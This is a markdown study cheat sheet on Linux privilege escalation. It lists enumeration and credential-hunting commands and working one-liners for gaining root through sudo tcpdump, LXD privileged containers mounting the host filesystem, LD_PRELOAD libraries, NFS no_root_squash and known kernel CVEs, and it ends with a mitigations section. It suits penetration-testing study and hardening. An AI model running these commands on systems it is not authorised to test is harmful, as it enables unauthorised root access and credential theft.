# Linux Privilege Escalation
## 🎯 Main Idea
- Escalate from a low-privileged shell to **root** on a Linux host by abusing misconfigurations, weak permissions, and vulnerable software.
- Enumeration is the key: OS/kernel version, running services, SUID/SGID, sudo rights, cron jobs, writable files, credentials.
- Full root compromise enables traffic capture, sensitive file access, and (if domain-joined) pivoting into Active Directory.

## 💥 Attack / Exploit Vectors

### Environment & Service Enumeration
- Baseline recon to spot escalation paths (processes, users, networking, packages, mounts).
- **Commands**
  - `ps aux | grep root` — see processes running as root
  - `ps au` — see logged-in users
  - `ls /home` — view user home directories
  - `ls -l ~/.ssh` — check for SSH keys
  - `history` — review Bash history
  - `lsblk` — find unmounted file systems/drives
  - `uname -a` — check kernel version
  - `cat /etc/lsb-release` — check OS version
  - `screen -v` — check Screen version (4.05.00 vuln)
  - `./pspy64 -pf -i 1000` — monitor running processes/cron with pspy

### Credential Hunting
- Search files, configs, history, and SSH keys for reusable credentials.
- **Commands**
  - `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` — search for config files
  - `ls -l ~/.ssh` — hunt SSH private keys

### World-Writable Files & Directories
- Writable files/dirs owned or used by root allow content tampering.
- **Commands**
  - `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null` — world-writable directories
  - `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` — world-writable files

### Path Abuse
- Prepend a writable directory to `$PATH` so a crafted binary runs instead of the real one.
- **Commands**
  - `echo $PATH` — inspect current PATH
  - `PATH=.:${PATH}` — add `.` to the start of PATH

### Wildcard Abuse
- Inject command-line flags via filenames when a script/cron uses unquoted wildcards (e.g. tar, chown).
- Create files named like options (e.g. `--checkpoint`, `--checkpoint-action=exec=...`) to force execution.

### Escaping Restricted Shells
- Break out of rbash/rksh-style restricted shells to a full shell.
- Techniques: abuse allowed binaries (vi/vim, awk, find, ed), environment variables, and command injection to spawn `/bin/sh`.

### Special Permissions (SUID / SGID)
- SUID/SGID binaries run with the owner's (often root) privileges; abuse via GTFOBins.
- **Commands**
  - `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` — find SUID binaries
  - `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` — find SETGID binaries

### Sudo Rights Abuse
- Abuse `sudo -l`-allowed commands (GTFOBins) to run code as root.
- **Commands**
  - `sudo -l` — list commands the user can run as another user
  - `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` — priv esc via tcpdump `-z` postrotate

### Privileged Groups
- Membership in powerful groups (docker, lxd, disk, adm, video, shadow) grants indirect root.
- Abuse group-mounted NFS, container sockets, or raw disk access to read/modify root-owned data.

### Linux Capabilities
- File capabilities (e.g. `cap_setuid`, `cap_dac_read_search`) grant subset root powers without SUID.
- **Commands**
  - `getcap -r / 2>/dev/null` — enumerate capabilities set on binaries

### Vulnerable Services
- Services running as root with known flaws (e.g. Screen 4.05.00) give easy wins.
- Identify version, match public PoC, exploit.

### Cron Job Abuse
- Writable scripts or wildcard usage in root cron jobs let you execute code as root on schedule.
- **Commands**
  - `ls -la /etc/cron.daily` — check for daily cron jobs
  - `./pspy64 -pf -i 1000` — catch cron execution without read access to crontab

### Containers — LXC / LXD
- `lxd`/`lxc` group members can launch a privileged container mounting the host filesystem.
- **Commands**
  - `lxd init` — start LXD init
  - `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine` — import local image
  - `lxc init alpine r00t -c security.privileged=true` — privileged container
  - `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true` — mount host FS
  - `lxc start r00t` — start container (then read /mnt/root)

### Docker
- Abuse docker group/socket, privileged containers, or mounts to break out to the host as root.
- Techniques: mount host `/` into a container, abuse `--privileged`, exposed `docker.sock`.

### Kubernetes
- Abuse exposed kubelet/API, service-account tokens, and privileged pods to escalate/escape.
- Deploy a pod mounting the host filesystem or with privileged securityContext.

### Logrotate Abuse (Logrotten)
- Race logrotate's handling of writable logs to execute a payload as root.

### Shared Libraries — LD_PRELOAD / LD_LIBRARY_PATH
- Preload a malicious shared object when a sudo-allowed binary preserves env vars.
- **Commands**
  - `ldd /bin/ls` — view shared objects a binary requires
  - `gcc src.c -fPIC -shared -o /development/libshared.so` — compile a malicious shared library
  - `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart` — escalate via LD_PRELOAD

### Shared Object Hijacking (RUNPATH)
- Plant a malicious `.so` in a writable RUNPATH directory that a SUID/root binary loads.
- **Commands**
  - `readelf -d payroll | grep PATH` — check the RUNPATH of a binary

### Python Library Hijacking
- Exploit writable/importable Python modules (PYTHONPATH, writable library file, module search order) run by root.
- Overwrite or shadow an imported module to execute code as root.

### NFS / tmux / Misc Techniques
- `no_root_squash` NFS exports let you create a root-owned SUID file; shared tmux/screen sockets allow session hijacking.
- **Commands**
  - `showmount -e 10.129.2.12` — show NFS export list
  - `sudo mount -t nfs 10.129.2.12:/tmp /mnt` — mount NFS share locally
  - `tmux -S /shareds new -s debugsess` — create a shared tmux session socket

### Kernel Exploits
- Match kernel version to a public exploit; compile and run (risky on production).
- **Commands**
  - `gcc kernel_expoit.c -o kernel_expoit` — compile a C exploit

### Known CVE Exploits
- **Sudo (Baron Samedit, CVE-2021-3156)** — heap overflow in sudoedit.
- **Polkit (CVE-2021-3560)** — pkexec/dbus auth bypass to root.
- **Dirty Pipe (CVE-2022-0847)** — overwrite read-only files via pipe page cache.
- **Netfilter (CVE-2021-22555 / nf_tables)** — kernel heap exploit to root.

## 🛠️ Key Tools & Concepts
- `pspy` — monitor processes/cron without root
- `LinEnum` / `linPEAS` — automated enumeration scripts
- `GTFOBins` — reference for abusing SUID/sudo binaries
- `Lynis` — system audit tool (`./lynis audit system`)
- `getcap`, `ldd`, `readelf`, `find`, `gcc` — manual enumeration/compilation

## 🛡️ Mitigations
- Keep OS, kernel, and packages patched; remove unneeded SUID/SGID bits.
- Principle of least privilege for sudo rights, groups, and capabilities.
- Avoid wildcards and writable paths in root cron jobs/scripts; quote variables.
- Harden NFS (`root_squash`), restrict container/docker group membership.
- Audit with `Lynis`; use AppArmor/SELinux; monitor for privilege escalation attempts.
